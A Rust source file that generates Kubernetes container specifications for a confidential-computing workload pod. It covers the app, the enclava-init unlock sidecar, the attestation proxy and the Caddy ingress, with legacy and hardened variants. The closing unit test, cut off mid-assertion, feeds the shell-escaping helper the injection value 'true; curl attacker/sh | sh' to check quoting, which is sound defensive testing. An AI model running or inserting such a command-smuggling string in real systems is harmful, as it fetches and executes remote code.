//! Container builders for the confidential workload pod.
//!
//! Phase 5 introduces a fourth container `enclava-init` (Rust replacement for
//! bootstrap_script.sh) and reshapes app/caddy to drop privileged + shell
//! interpolation. App/caddy processes start under an argv-preserving
//! `enclava-wait-exec` helper copied from the trusted enclava-init image, then
//! `enclava-init` opens LUKS and stays alive as the in-guest bind-mount source.
//! The legacy bootstrap_script.sh path is still emittable behind the
//! `LEGACY_BOOTSTRAP_SCRIPT=true` env var so existing pods can be reconciled
//! without disruption; new deploys default to the enclava-init shape.

use k8s_openapi::api::core::v1::{
    Capabilities, Container, ContainerPort, EnvVar, ExecAction, HTTPGetAction, Probe,
    SecurityContext, TCPSocketAction, VolumeDevice, VolumeMount,
};
use k8s_openapi::apimachinery::pkg::api::resource::Quantity;
use k8s_openapi::apimachinery::pkg::util::intstr::IntOrString;

use crate::manifest::cc_init_data;
use crate::types::{CaddyTlsMode, ConfidentialApp};
use enclava_common::types::UnlockMode;
use enclava_common::validate::validate_http_path;

/// True when the operator has opted back into the legacy bootstrap_script.sh
/// flow. Defaults to false — Phase 5 ships enclava-init as the default.
pub fn legacy_bootstrap_enabled() -> bool {
    std::env::var("LEGACY_BOOTSTRAP_SCRIPT")
        .map(|v| v.eq_ignore_ascii_case("true") || v == "1")
        .unwrap_or(false)
}

/// Image reference for the enclava-init initContainer. Production release
/// builds require a digest-pinned operator-supplied image; debug builds keep a
/// placeholder so manifest unit tests do not need registry access.
pub fn enclava_init_image() -> String {
    let image = std::env::var("ENCLAVA_INIT_IMAGE").unwrap_or_else(|_| {
        if cfg!(debug_assertions) {
            "enclava-init:dev".to_string()
        } else {
            panic!("ENCLAVA_INIT_IMAGE must be set to a digest-pinned image")
        }
    });
    if !cfg!(debug_assertions) && !image.contains("@sha256:") {
        panic!("ENCLAVA_INIT_IMAGE must be digest-pinned with @sha256:")
    }
    image
}

pub const ENCLAVA_WAIT_EXEC_PATH: &str = "/enclava-tools/enclava-wait-exec";
pub const APP_SEED_PATH: &str = "/state/app/seed";
pub const CADDY_SEED_PATH: &str = "/state/caddy/seed";
pub const CADDY_ACME_TLS_PORT: i32 = 10443;
pub const CADDY_INTERNAL_TLS_PORT: i32 = 10443;
pub const CADDY_INTERNAL_RUNTIME_PATH: &str = "/run/enclava/caddy-runtime";
pub const CADDY_BROKER_CERT_PATH: &str = "/run/enclava/caddy-runtime/certificates/tls.crt";
pub const CADDY_BROKER_KEY_PATH: &str = "/run/enclava/caddy-runtime/certificates/tls.key";
pub const UNLOCK_SOCKET_PATH: &str = "/run/enclava-unlock/unlock.sock";
const APP_STARTUP_PROBE_PERIOD_SECONDS: i32 = 5;
const APP_STARTUP_PROBE_FAILURE_THRESHOLD: i32 = 17_280;
const APP_HTTP_PROBE_MAX_PERIOD_SECONDS: i32 = 15;
const APP_HTTP_PROBE_MAX_TIMEOUT_SECONDS: i32 = 5;

fn shell_escape_arg(arg: &str) -> String {
    if arg.is_empty() {
        return "''".to_string();
    }
    let escaped = arg.replace('\'', "'\"'\"'");
    format!("'{escaped}'")
}

fn shell_escape_argv(args: &[String]) -> String {
    args.iter()
        .map(|arg| shell_escape_arg(arg))
        .collect::<Vec<_>>()
        .join(" ")
}

fn caddy_supervisor_script(tls_mode: CaddyTlsMode) -> String {
    let mut script = String::new();
    script.push_str("trap 'exit 0' TERM INT\n");
    if tls_mode == CaddyTlsMode::Dns01Broker {
        script.push_str("i=0\n");
        script.push_str("while [ \"$i\" -lt 300 ]; do\n");
        script.push_str(&format!(
            "  if [ -r {} ] && [ -r {} ]; then break; fi\n",
            shell_escape_arg(CADDY_BROKER_CERT_PATH),
            shell_escape_arg(CADDY_BROKER_KEY_PATH)
        ));
        script.push_str(
            "  if [ \"$i\" = 0 ] || [ $((i % 10)) -eq 0 ]; then echo 'tenant-ingress waiting for TLS certificate handoff' >&2; fi\n",
        );
        script.push_str("  i=$((i + 1))\n");
        script.push_str("  sleep 1\n");
        script.push_str("done\n");
        script.push_str(&format!(
            "if [ ! -r {} ] || [ ! -r {} ]; then echo 'tenant-ingress TLS certificate handoff missing or unreadable' >&2; exit 1; fi\n",
            shell_escape_arg(CADDY_BROKER_CERT_PATH),
            shell_escape_arg(CADDY_BROKER_KEY_PATH)
        ));
    }
    script.push_str("while true; do\n");
    script.push_str("  rc=0\n");
    script.push_str("  if /usr/bin/caddy validate --config /etc/caddy/Caddyfile; then\n");
    script.push_str("    /usr/bin/caddy run --config /etc/caddy/Caddyfile || rc=$?\n");
    script.push_str("  else\n");
    script.push_str("    rc=$?\n");
    script.push_str("  fi\n");
    script.push_str("  echo \"tenant-ingress caddy exited rc=$rc; restarting in 5s\" >&2\n");
    script.push_str("  sleep 5\n");
    script.push_str("done");
    script
}

fn ownership_mode_str(mode: UnlockMode) -> &'static str {
    match mode {
        UnlockMode::Auto => "auto-unlock",
        UnlockMode::Password => "password",
    }
}

fn env(name: &str, value: &str) -> EnvVar {
    EnvVar {
        name: name.to_string(),
        value: Some(value.to_string()),
        ..Default::default()
    }
}

fn env_field_ref(name: &str, field_path: &str) -> EnvVar {
    use k8s_openapi::api::core::v1::{EnvVarSource, ObjectFieldSelector};
    EnvVar {
        name: name.to_string(),
        value_from: Some(EnvVarSource {
            field_ref: Some(ObjectFieldSelector {
                field_path: field_path.to_string(),
                ..Default::default()
            }),
            ..Default::default()
        }),
        ..Default::default()
    }
}

fn validated_health_path(app: &ConfidentialApp) -> &str {
    validate_http_path(&app.health.path)
        .expect("health path must validate before manifest generation");
    &app.health.path
}

fn app_http_probe(app: &ConfidentialApp, app_port: i32) -> HTTPGetAction {
    HTTPGetAction {
        path: Some(validated_health_path(app).to_string()),
        port: IntOrString::Int(app_port),
        scheme: Some("HTTP".to_string()),
        ..Default::default()
    }
}

fn app_tcp_probe(app_port: i32) -> TCPSocketAction {
    TCPSocketAction {
        port: IntOrString::Int(app_port),
        ..Default::default()
    }
}

fn capped_http_probe_period(app: &ConfidentialApp) -> i32 {
    (app.health.interval_seconds as i32)
        .max(1)
        .min(APP_HTTP_PROBE_MAX_PERIOD_SECONDS)
}

fn capped_http_probe_timeout(app: &ConfidentialApp) -> i32 {
    (app.health.timeout_seconds as i32)
        .max(1)
        .min(APP_HTTP_PROBE_MAX_TIMEOUT_SECONDS)
}

pub(crate) fn app_needs_startup_fallback(app: &ConfidentialApp) -> bool {
    app.primary_container()
        .map(|primary| {
            primary
                .command
                .as_ref()
                .map(|command| command.is_empty())
                .unwrap_or(true)
        })
        .unwrap_or(true)
}

/// Build the app container.
///
/// Phase 5 default: unprivileged, drops ALL caps, reads its seed from
/// `/state/app/seed` written by the enclava-init sidecar. The user's
/// command is passed as a proper argv list — no `sh -c` interpolation.
pub fn build_app_container(app: &ConfidentialApp) -> Container {
    let primary = app
        .primary_container()
        .expect("app must have a primary container");

    let app_port = primary.port.unwrap_or(8080);
    let legacy = legacy_bootstrap_enabled();

    let mut env_vars = Vec::new();
    if legacy {
        let mode = ownership_mode_str(app.unlock_mode);
        let bind_mounts_str = primary
            .storage_paths
            .iter()
            .map(|path| {
                let subdir = path.trim_start_matches('/').replace('/', "-");
                format!("{}/{}:{}", app.storage.app_data.mount_path, subdir, path)
            })
            .collect::<Vec<_>>()
            .join(",");
        env_vars.extend([
            env("CRYPTSETUP_DEVICE", &app.storage.app_data.device_path),
            env("VOLUME_MOUNT_POINT", &app.storage.app_data.mount_path),
            env("SECURE_PV_STRIP_RUNTIME_CAPS", "true"),
            env("SECURE_PV_LUKS_INTEGRITY", "hmac-sha256"),
            env("SECURE_PV_BIND_MOUNTS", &bind_mounts_str),
            env("SECURE_PV_EXEC_AS", "10001:10001"),
            env("SECURE_PV_CHOWN_RECURSIVE", "true"),
            env("WORKLOAD_SECRET_SOURCE", "kbs"),
            env(
                "WORKLOAD_SECRET_PATH",
                "/run/secure-pv/workload-secret-seed",
            ),
            env("KBS_CDH_ENDPOINT", "http://127.0.0.1:8081/cdh/resource"),
            env_field_ref("LUKS_MAPPING_NAME", "metadata.name"),
            env("ENCLAVA_SECURE_PV_BOOTSTRAP", "1"),
            env("SECURE_PV_RESET_ON_KEY_MISMATCH", "false"),
            env("STORAGE_OWNERSHIP_MODE", mode),
            env("OWNERSHIP_SLOT", "app-data"),
            env("OWNERSHIP_MOUNT_PATH", "/run/ownership-signal"),
            env("SKIP_ATTESTATION_CHECK", "true"),
            env("KBS_FETCH_RETRIES", "120"),
            env("KBS_FETCH_RETRY_SLEEP_SECONDS", "2"),
            env("KBS_FETCH_MAX_SLEEP_SECONDS", "10"),
            env("KBS_FETCH_REQUEST_TIMEOUT_SECONDS", "8"),
        ]);
    } else {
        env_vars.push(env("APP_SEED_PATH", APP_SEED_PATH));
        env_vars.push(env("VOLUME_MOUNT_POINT", "/state"));
        env_vars.push(env("ENCLAVA_CONTAINER_NAME", &primary.name));
        env_vars.push(env("ENCLAVA_STARTED_DIR", "/run/enclava/containers"));
        env_vars.push(env("ENCLAVA_INIT_READY_FILE", "/run/enclava/init-ready"));
    }

    let (command, args): (Option<Vec<String>>, Option<Vec<String>>) = if legacy {
        let user_cmd = if let Some(ref cmd) = primary.command {
            shell_escape_argv(cmd)
        } else {
            "/bin/sh -c 'exec /usr/local/bin/app'".to_string()
        };
        (
            Some(vec![
                "/bin/sh".to_string(),
                "-c".to_string(),
                format!("/secure-pv/bootstrap.sh -- {user_cmd}"),
            ]),
            None,
        )
    } else {
        (
            Some(vec![ENCLAVA_WAIT_EXEC_PATH.to_string()]),
            primary.command.clone(),
        )
    };

    let mut volume_mounts = Vec::new();
    if legacy {
        volume_mounts.extend([
            VolumeMount {
                name: "secure-pv-bootstrap".to_string(),
                mount_path: "/secure-pv".to_string(),
                read_only: Some(true),
                ..Default::default()
            },
            VolumeMount {
                name: "startup".to_string(),
                mount_path: "/startup".to_string(),
                read_only: Some(true),
                ..Default::default()
            },
            VolumeMount {
                name: "ownership-signal".to_string(),
                mount_path: "/run/ownership-signal".to_string(),
                ..Default::default()
            },
        ]);
    } else {
        volume_mounts.push(VolumeMount {
            name: "enclava-tools".to_string(),
            mount_path: "/enclava-tools".to_string(),
            read_only: Some(true),
            ..Default::default()
        });
        if app_needs_startup_fallback(app) {
            volume_mounts.push(VolumeMount {
                name: "startup".to_string(),
                mount_path: "/startup".to_string(),
                read_only: Some(true),
                ..Default::default()
            });
        }
        volume_mounts.push(VolumeMount {
            name: "unlock-socket".to_string(),
            mount_path: "/run/enclava".to_string(),
            ..Default::default()
        });
        volume_mounts.push(VolumeMount {
            name: "state-mount".to_string(),
            mount_path: "/state".to_string(),
            mount_propagation: Some("HostToContainer".to_string()),
            ..Default::default()
        });
    }

    let security_context = if legacy {
        SecurityContext {
            privileged: Some(true),
            allow_privilege_escalation: Some(true),
            run_as_user: Some(0),
            run_as_group: Some(0),
            run_as_non_root: Some(false),
            capabilities: Some(Capabilities {
                drop: Some(vec!["ALL".to_string()]),
                add: Some(vec!["SYS_ADMIN".to_string()]),
            }),
            ..Default::default()
        }
    } else {
        SecurityContext {
            privileged: Some(false),
            allow_privilege_escalation: Some(false),
            run_as_user: Some(10001),
            run_as_group: Some(10001),
            run_as_non_root: Some(true),
            read_only_root_filesystem: Some(true),
            capabilities: Some(Capabilities {
                drop: Some(vec!["ALL".to_string()]),
                add: None,
            }),
            ..Default::default()
        }
    };

    let volume_devices = if legacy {
        Some(vec![VolumeDevice {
            name: "state".to_string(),
            device_path: "/dev/csi0".to_string(),
        }])
    } else {
        None
    };

    Container {
        name: primary.name.clone(),
        image: Some(primary.image.digest_ref()),
        command,
        args,
        env: Some(env_vars),
        ports: Some(vec![ContainerPort {
            container_port: app_port as i32,
            ..Default::default()
        }]),
        volume_devices,
        volume_mounts: Some(volume_mounts),
        security_context: Some(security_context),
        resources: Some(k8s_openapi::api::core::v1::ResourceRequirements {
            requests: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("512Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("250m".to_string()));
                m
            }),
            limits: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity(app.resources.memory.clone()));
                m.insert("cpu".to_string(), Quantity(app.resources.cpu.clone()));
                m
            }),
            ..Default::default()
        }),
        readiness_probe: Some(k8s_openapi::api::core::v1::Probe {
            http_get: Some(app_http_probe(app, app_port as i32)),
            initial_delay_seconds: Some(180),
            period_seconds: Some(capped_http_probe_period(app)),
            timeout_seconds: Some(capped_http_probe_timeout(app)),
            ..Default::default()
        }),
        startup_probe: Some(k8s_openapi::api::core::v1::Probe {
            tcp_socket: Some(app_tcp_probe(app_port as i32)),
            period_seconds: Some(APP_STARTUP_PROBE_PERIOD_SECONDS),
            timeout_seconds: Some(capped_http_probe_timeout(app)),
            failure_threshold: Some(APP_STARTUP_PROBE_FAILURE_THRESHOLD),
            ..Default::default()
        }),
        liveness_probe: None,
        ..Default::default()
    }
}

/// Build the enclava-init mounter sidecar (Phase 5).
///
/// Performs Argon2id-based unlock or KBS autounlock, opens both LUKS block
/// PVCs, mounts the decrypted filesystems into shared mountpoint volumes, runs
/// the Trustee policy verification chain, writes per-component HKDF seeds to
/// /state/{caddy,app}/seed, bind-mounts the decrypted paths into app/caddy
/// mount namespaces, marks itself ready, and then stays alive. Live Kata
/// SEV-SNP validation showed the worker runtime must combine block hotplug with
/// `virtio-9p` filesystem sharing. CAP avoids Kubernetes mountPropagation, so
/// app/caddy start under an in-image `enclava-wait-exec` helper and signal this
/// sidecar with their PIDs before it opens the devices.
///
/// The sidecar needs device-mapper and mount namespace rights. App and caddy
/// remain unprivileged and only consume the decrypted mountpoints.
pub fn build_enclava_init_container(app: &ConfidentialApp) -> Container {
    let wait_containers = format!(
        "{},tenant-ingress,attestation-proxy",
        app.primary_container().unwrap().name
    );
    Container {
        name: "enclava-init".to_string(),
        image: Some(enclava_init_image()),
        command: Some(vec!["/usr/local/bin/enclava-init".to_string()]),
        env: Some(vec![
            env("ENCLAVA_INIT_CONFIG", "/etc/enclava-init/config.toml"),
            env("ENCLAVA_INIT_STAY_ALIVE", "true"),
            env("ENCLAVA_INIT_READY_FILE", "/run/enclava/init-ready"),
            env("ENCLAVA_INIT_STARTED_DIR", "/run/enclava/containers"),
            env("ENCLAVA_INIT_UNLOCK_SOCKET_GID", "10001"),
            env("ENCLAVA_INIT_WAIT_FOR_CONTAINERS", &wait_containers),
        ]),
        volume_mounts: Some(vec![
            VolumeMount {
                name: "state-mount".to_string(),
                mount_path: "/state".to_string(),
                mount_propagation: Some("Bidirectional".to_string()),
                ..Default::default()
            },
            VolumeMount {
                name: "tls-state-mount".to_string(),
                mount_path: "/state/tls-state".to_string(),
                mount_propagation: Some("Bidirectional".to_string()),
                ..Default::default()
            },
            VolumeMount {
                name: "unlock-socket".to_string(),
                mount_path: "/run/enclava".to_string(),
                ..Default::default()
            },
            VolumeMount {
                name: "unlock-channel".to_string(),
                mount_path: "/run/enclava-unlock".to_string(),
                ..Default::default()
            },
            VolumeMount {
                name: "enclava-init-config".to_string(),
                mount_path: "/etc/enclava-init".to_string(),
                read_only: Some(true),
                ..Default::default()
            },
        ]),
        volume_devices: Some(vec![
            VolumeDevice {
                name: "state".to_string(),
                device_path: app.storage.app_data.device_path.clone(),
            },
            VolumeDevice {
                name: "tls-state".to_string(),
                device_path: app.storage.tls_data.device_path.clone(),
            },
        ]),
        security_context: Some(SecurityContext {
            privileged: Some(true),
            allow_privilege_escalation: Some(true),
            run_as_user: Some(0),
            run_as_group: Some(0),
            run_as_non_root: Some(false),
            read_only_root_filesystem: Some(true),
            capabilities: Some(Capabilities {
                drop: Some(vec!["ALL".to_string()]),
                add: Some(vec!["SYS_ADMIN".to_string()]),
            }),
            ..Default::default()
        }),
        readiness_probe: Some(enclava_init_ready_probe()),
        resources: Some(k8s_openapi::api::core::v1::ResourceRequirements {
            requests: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("64Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("50m".to_string()));
                m
            }),
            limits: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("512Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("250m".to_string()));
                m
            }),
            ..Default::default()
        }),
        ..Default::default()
    }
}

pub fn build_enclava_tools_init_container() -> Container {
    Container {
        name: "enclava-tools".to_string(),
        image: Some(enclava_init_image()),
        command: Some(vec![
            "/bin/sh".to_string(),
            "-eu".to_string(),
            "-c".to_string(),
            "cp /usr/local/bin/enclava-wait-exec /work/enclava-wait-exec && chmod 0555 /work/enclava-wait-exec && install -d -m 02770 -o 0 -g 10001 /run/enclava/containers".to_string(),
        ]),
        volume_mounts: Some(vec![
            VolumeMount {
                name: "enclava-tools".to_string(),
                mount_path: "/work".to_string(),
                ..Default::default()
            },
            VolumeMount {
                name: "unlock-socket".to_string(),
                mount_path: "/run/enclava".to_string(),
                ..Default::default()
            },
        ]),
        security_context: Some(SecurityContext {
            allow_privilege_escalation: Some(false),
            read_only_root_filesystem: Some(true),
            run_as_non_root: Some(false),
            run_as_user: Some(0),
            run_as_group: Some(0),
            capabilities: Some(Capabilities {
                add: None,
                drop: Some(vec!["ALL".to_string()]),
            }),
            ..Default::default()
        }),
        resources: Some(k8s_openapi::api::core::v1::ResourceRequirements {
            requests: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("16Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("10m".to_string()));
                m
            }),
            limits: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("64Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("50m".to_string()));
                m
            }),
            ..Default::default()
        }),
        ..Default::default()
    }
}

fn enclava_init_ready_probe() -> Probe {
    Probe {
        exec: Some(ExecAction {
            command: Some(vec![
                "/usr/local/bin/enclava-init".to_string(),
                "--probe-ready".to_string(),
            ]),
        }),
        period_seconds: Some(5),
        timeout_seconds: Some(2),
        failure_threshold: Some(17_280), // 24h for password-unlock pods.
        ..Default::default()
    }
}

fn proxy_volume_mounts(legacy: bool) -> Vec<VolumeMount> {
    let mut v = vec![
        VolumeMount {
            name: "ownership-signal".to_string(),
            mount_path: "/run/ownership-signal".to_string(),
            ..Default::default()
        },
        VolumeMount {
            name: "state-mount".to_string(),
            mount_path: "/data".to_string(),
            mount_propagation: Some("HostToContainer".to_string()),
            ..Default::default()
        },
        VolumeMount {
            name: "state-mount".to_string(),
            mount_path: "/state".to_string(),
            mount_propagation: Some("HostToContainer".to_string()),
            ..Default::default()
        },
    ];
    if !legacy {
        v.push(VolumeMount {
            name: "unlock-socket".to_string(),
            mount_path: "/run/enclava".to_string(),
            ..Default::default()
        });
        v.push(VolumeMount {
            name: "unlock-channel".to_string(),
            mount_path: "/run/enclava-unlock".to_string(),
            ..Default::default()
        });
    }
    v
}

fn proxy_security_context(_legacy: bool) -> SecurityContext {
    SecurityContext {
        allow_privilege_escalation: Some(false),
        read_only_root_filesystem: Some(true),
        run_as_non_root: Some(false),
        run_as_user: Some(0),
        run_as_group: Some(0),
        capabilities: Some(Capabilities {
            add: Some(vec![
                "CHOWN".to_string(),
                "MKNOD".to_string(),
                "SYS_PTRACE".to_string(),
            ]),
            drop: Some(vec!["ALL".to_string()]),
        }),
        ..Default::default()
    }
}

pub fn build_attestation_proxy_container(app: &ConfidentialApp) -> Container {
    let primary = app
        .primary_container()
        .expect("app must have a primary container");
    let mode = ownership_mode_str(app.unlock_mode);
    let legacy = legacy_bootstrap_enabled();

    let mut env_vars = vec![
        env("ATTESTATION_WORKLOAD_CONTAINER", &primary.name),
        env_field_ref("ATTESTATION_POD_NAME", "metadata.name"),
        env_field_ref("ATTESTATION_POD_NAMESPACE", "metadata.namespace"),
        env("ATTESTATION_PROFILE", "coco-sev-snp"),
        env("ATTESTATION_RUNTIME_CLASS", "kata-qemu-snp"),
        env("ATTESTATION_WORKLOAD_IMAGE", &primary.image.digest_ref()),
        env("ATTESTATION_BIND", "127.0.0.1"),
        env("ATTESTATION_TLS_BIND", "0.0.0.0"),
        env("ATTESTATION_TLS_PORT", "8443"),
        env("TEE_DOMAIN", &app.domain.tee_domain),
        env("CAP_API_SIGNING_PUBKEY", &app.api_signing_pubkey),
        env("CAP_CONFIG_DIR", "/state/app-data/.enclava/config"),
        env(
            "CAP_CONFIG_READY_MARKER",
            "/state/app-data/.enclava/luks-ready",
        ),
        env("CAP_CONFIG_FILE_GID", "10001"),
        env("STORAGE_OWNERSHIP_MODE", mode),
        env("INSTANCE_ID", &app.owner_instance_id()),
        env("OWNER_CIPHERTEXT_BACKEND", "kbs-resource"),
        env("OWNER_SEED_HANDOFF_SLOTS", "app-data"),
        env("OWNERSHIP_MOUNT_PATH", "/run/ownership-signal"),
        env(
            "KBS_RESOURCE_URL",
            &cc_init_data::trustee_kbs_resource_url(),
        ),
        env("KBS_RESOURCE_CACHE_SECONDS", "300"),
        env("KBS_RESOURCE_FAILURE_CACHE_SECONDS", "30"),
        env("KBS_FETCH_RETRIES", "120"),
        env("KBS_FETCH_RETRY_SLEEP_SECONDS", "2"),
        env("KBS_FETCH_MAX_SLEEP_SECONDS", "10"),
        env("KBS_FETCH_REQUEST_TIMEOUT_SECONDS", "10"),
    ];
    if !legacy {
        env_vars.push(env("ENCLAVA_CONTAINER_NAME", "attestation-proxy"));
        env_vars.push(env("ENCLAVA_STARTED_DIR", "/run/enclava/containers"));
        env_vars.push(env("ENCLAVA_INIT_UNLOCK_SOCKET", UNLOCK_SOCKET_PATH));
    }
    if let Some(cert) = cc_init_data::trustee_kbs_ca_cert_pem() {
        env_vars.push(env("KBS_RESOURCE_CA_CERT_PEM", &cert));
    }

    Container {
        name: "attestation-proxy".to_string(),
        image: Some(app.attestation.proxy_image.digest_ref()),
        command: Some(vec!["/attestation-proxy".to_string()]),
        ports: Some(vec![
            ContainerPort {
                container_port: 8081,
                name: Some("attest-http".to_string()),
                ..Default::default()
            },
            ContainerPort {
                container_port: 8443,
                name: Some("attestation".to_string()),
                ..Default::default()
            },
        ]),
        env: Some(env_vars),
        volume_mounts: Some(proxy_volume_mounts(legacy)),
        security_context: Some(proxy_security_context(legacy)),
        resources: Some(k8s_openapi::api::core::v1::ResourceRequirements {
            requests: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("128Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("100m".to_string()));
                m
            }),
            limits: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("256Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("500m".to_string()));
                m
            }),
            ..Default::default()
        }),
        readiness_probe: Some(k8s_openapi::api::core::v1::Probe {
            http_get: Some(k8s_openapi::api::core::v1::HTTPGetAction {
                path: Some("/health".to_string()),
                port: k8s_openapi::apimachinery::pkg::util::intstr::IntOrString::Int(8443),
                scheme: Some("HTTPS".to_string()),
                ..Default::default()
            }),
            initial_delay_seconds: Some(10),
            period_seconds: Some(10),
            ..Default::default()
        }),
        ..Default::default()
    }
}

/// Build the caddy tenant-ingress sidecar container.
///
/// Phase 5 default: unprivileged and listens on a high HTTPS port. Reads
/// its seed from `/state/caddy/seed` and persists Caddy runtime
/// state through an init-managed handoff directory under `/run/enclava`. The Cloudflare
/// DNS-01 path is gone — Phase 0 cut over to TLS-ALPN-01 — so caddy carries
/// no `CF_API_TOKEN` env and no `tls-cloudflare-token` secret mount.
pub fn build_caddy_container(app: &ConfidentialApp) -> Container {
    let legacy = legacy_bootstrap_enabled();
    let tls_port = match app.attestation.caddy_tls_mode {
        CaddyTlsMode::Acme | CaddyTlsMode::Dns01Broker => CADDY_ACME_TLS_PORT,
        CaddyTlsMode::Internal => CADDY_INTERNAL_TLS_PORT,
    };

    let env_vars = if legacy {
        vec![
            env_field_ref("POD_NAME", "metadata.name"),
            env_field_ref("POD_NAMESPACE", "metadata.namespace"),
            env("CRYPTSETUP_DEVICE", &app.storage.tls_data.device_path),
            env("VOLUME_MOUNT_POINT", &app.storage.tls_data.mount_path),
            env("SECURE_PV_STRIP_RUNTIME_CAPS", "false"),
            env("SECURE_PV_LUKS_INTEGRITY", "hmac-sha256"),
            env("WORKLOAD_SECRET_SOURCE", "kbs"),
            env("WORKLOAD_SECRET_PATH", "/run/secure-pv/tls-secret-seed"),
            env("KBS_RESOURCE_PATH", &app.tls_resource_path()),
            env("KBS_CDH_ENDPOINT", "http://127.0.0.1:8081/cdh/resource"),
            env_field_ref("LUKS_MAPPING_NAME", "metadata.name"),
            env("ENCLAVA_SECURE_PV_BOOTSTRAP", "1"),
            env("FLOWFORGE_SECURE_PV_BOOTSTRAP", "1"),
            env("SECURE_PV_RESET_ON_KEY_MISMATCH", "false"),
            env("STORAGE_OWNERSHIP_MODE", "kbs-resource"),
            env("OWNERSHIP_SLOT", "tls-data"),
            env("XDG_DATA_HOME", "/tls-data/caddy"),
            env("KBS_FETCH_RETRIES", "120"),
            env("KBS_FETCH_RETRY_SLEEP_SECONDS", "2"),
            env("KBS_FETCH_MAX_SLEEP_SECONDS", "10"),
        ]
    } else {
        vec![
            env_field_ref("POD_NAME", "metadata.name"),
            env_field_ref("POD_NAMESPACE", "metadata.namespace"),
            env("CADDY_SEED_PATH", CADDY_SEED_PATH),
            env("VOLUME_MOUNT_POINT", CADDY_INTERNAL_RUNTIME_PATH),
            env("XDG_DATA_HOME", CADDY_INTERNAL_RUNTIME_PATH),
            env(
                "XDG_CONFIG_HOME",
                &format!("{CADDY_INTERNAL_RUNTIME_PATH}/config"),
            ),
            env("HOME", CADDY_INTERNAL_RUNTIME_PATH),
            env("ENCLAVA_CONTAINER_NAME", "tenant-ingress"),
            env("ENCLAVA_STARTED_DIR", "/run/enclava/containers"),
            env("ENCLAVA_INIT_READY_FILE", "/run/enclava/init-ready"),
        ]
    };

    let (command, args) = if legacy {
        (
            Some(vec![
                "/bin/sh".to_string(),
                "-c".to_string(),
                "LUKS_MAPPING_NAME=\"${LUKS_MAPPING_NAME}-tls\"\n\
                 export LUKS_MAPPING_NAME\n\
                 caddy validate --config /etc/caddy/Caddyfile\n\
                 exec /bin/sh /secure-pv/bootstrap.sh -- caddy run --config /etc/caddy/Caddyfile"
                    .to_string(),
            ]),
            None,
        )
    } else {
        (
            Some(vec![ENCLAVA_WAIT_EXEC_PATH.to_string()]),
            Some(vec![
                "/bin/sh".to_string(),
                "-ec".to_string(),
                caddy_supervisor_script(app.attestation.caddy_tls_mode),
            ]),
        )
    };

    let mut volume_mounts = vec![VolumeMount {
        name: "tenant-ingress-caddyfile".to_string(),
        mount_path: "/etc/caddy".to_string(),
        read_only: Some(true),
        ..Default::default()
    }];
    if legacy {
        volume_mounts.insert(
            0,
            VolumeMount {
                name: "secure-pv-bootstrap".to_string(),
                mount_path: "/secure-pv".to_string(),
                read_only: Some(true),
                ..Default::default()
            },
        );
        volume_mounts.push(VolumeMount {
            name: "ownership-signal".to_string(),
            mount_path: "/run/ownership-signal".to_string(),
            ..Default::default()
        });
    } else {
        volume_mounts.push(VolumeMount {
            name: "enclava-tools".to_string(),
            mount_path: "/enclava-tools".to_string(),
            read_only: Some(true),
            ..Default::default()
        });
        volume_mounts.push(VolumeMount {
            name: "unlock-socket".to_string(),
            mount_path: "/run/enclava".to_string(),
            ..Default::default()
        });
    }

    let security_context = if legacy {
        SecurityContext {
            privileged: Some(true),
            allow_privilege_escalation: Some(true),
            run_as_user: Some(0),
            run_as_group: Some(0),
            run_as_non_root: Some(false),
            capabilities: Some(Capabilities {
                drop: Some(vec!["ALL".to_string()]),
                add: Some(vec![
                    "SYS_ADMIN".to_string(),
                    "NET_BIND_SERVICE".to_string(),
                ]),
            }),
            ..Default::default()
        }
    } else {
        SecurityContext {
            privileged: Some(false),
            allow_privilege_escalation: Some(false),
            run_as_user: Some(10002),
            run_as_group: Some(10002),
            run_as_non_root: Some(true),
            read_only_root_filesystem: Some(false),
            capabilities: Some(Capabilities {
                drop: Some(vec!["ALL".to_string()]),
                add: None,
            }),
            ..Default::default()
        }
    };

    let volume_devices = if legacy {
        Some(vec![VolumeDevice {
            name: "tls-state".to_string(),
            device_path: "/dev/csi1".to_string(),
        }])
    } else {
        None
    };

    Container {
        name: "tenant-ingress".to_string(),
        image: Some(app.attestation.caddy_image.digest_ref()),
        command,
        args,
        ports: Some(vec![ContainerPort {
            container_port: tls_port,
            name: Some("https".to_string()),
            ..Default::default()
        }]),
        env: Some(env_vars),
        volume_devices,
        volume_mounts: Some(volume_mounts),
        security_context: Some(security_context),
        resources: Some(k8s_openapi::api::core::v1::ResourceRequirements {
            requests: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("128Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("100m".to_string()));
                m
            }),
            limits: Some({
                let mut m = std::collections::BTreeMap::new();
                m.insert("memory".to_string(), Quantity("256Mi".to_string()));
                m.insert("cpu".to_string(), Quantity("500m".to_string()));
                m
            }),
            ..Default::default()
        }),
        readiness_probe: Some(k8s_openapi::api::core::v1::Probe {
            tcp_socket: Some(TCPSocketAction {
                port: IntOrString::Int(tls_port),
                ..Default::default()
            }),
            initial_delay_seconds: Some(180),
            period_seconds: Some(15),
            timeout_seconds: Some(app.health.timeout_seconds as i32),
            ..Default::default()
        }),
        ..Default::default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_shell_escape_quotes_signed_command_args() {
        let rendered = shell_escape_argv(&[
            "true; curl attacker/sh | sh".to_string(),
            "arg with spaces".to_string(),
            "single'quote".to_string(),
            "".to_string(),
        ]);

        assert_eq!(
            rendered,
